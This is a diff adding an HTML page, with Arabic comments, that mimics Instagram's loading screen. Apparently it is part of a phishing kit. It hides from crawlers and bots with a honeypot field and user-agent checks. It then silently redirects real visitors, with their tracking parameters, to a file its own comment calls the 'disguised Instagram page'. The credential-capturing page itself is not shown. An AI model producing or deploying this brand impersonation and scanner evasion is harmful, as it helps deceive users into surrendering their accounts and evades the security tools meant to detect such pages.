@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#ffffff">
+    <title>Instagram</title>
+    <style>
+        /* تصميم الواجهة الصافية لانستغرام */
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-color: #ffffff;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .logo-wrapper {
+            flex-grow: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.8s ease-in-out;
+        }
+
+        .insta-icon {
+            width: 80px;
+            height: 80px;
+        }
+
+        .footer-meta {
+            padding-bottom: 40px;
+            text-align: center;
+            animation: fadeIn 1.2s ease-in-out;
+        }
+
+        .meta-text {
+            color: #8e8e8e;
+            font-size: 14px;
+            letter-spacing: 1px;
+        }
+
+        .meta-logo {
+            width: 70px;
+            margin-top: 8px;
+            opacity: 0.8;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        /* حماية: حقل مخفي للبوتات */
+        #bot_trap_field {
+            display: none !important;
+            visibility: hidden;
+        }
+    </style>
+</head>
+<body>
+
+    <input type="text" id="bot_trap_field" value="">
+
+    <div class="logo-wrapper">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram" class="insta-icon">
+    </div>
+
+    <div class="footer-meta">
+        <div class="meta-text">from</div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" class="meta-logo">
+    </div>
+
+    <script>
+        (function() {
+            // التحقق من المتصفح لصد البوتات البسيطة
+            const isProbablyBot = !('innerHeight' in window) || navigator.userAgent.includes("bot") || navigator.userAgent.includes("crawl");
+
+            setTimeout(function() {
+                const trap = document.getElementById('bot_trap_field').value;
+                
+                // إذا تم ملء الحقل المخفي أو تم اكتشاف بوت، يتم إيقاف العملية
+                if (trap !== "" || isProbablyBot) {
+                    console.log("Access Denied");
+                    return;
+                }
+
+                // التوجه لصفحة انستغرام المموهة مع نقل كافة الـ Parameters (id, redirect)
+                const currentQuery = window.location.search;
+                window.location.href = "i-q7.html" + currentQuery;
+
+            }, 2000); // الانتظار لمدة 2 ثانية
+        })();
+    </script>
+</body>
+</html>
